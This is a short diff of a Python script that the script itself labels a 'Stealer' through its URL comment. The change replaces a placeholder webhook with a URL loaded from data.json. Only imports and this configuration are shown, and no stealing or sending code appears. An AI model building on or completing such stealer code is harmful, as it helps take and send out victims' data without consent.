@@ -1,13 +1,14 @@
-
 import subprocess
 import os
 import sys
+import json
 import requests
 
 
-
 #Stealer URL
-url = 'Enter webhook'
+x = open('data.json')
+data = json.load(x)
+url = data["url"]
 
 
 
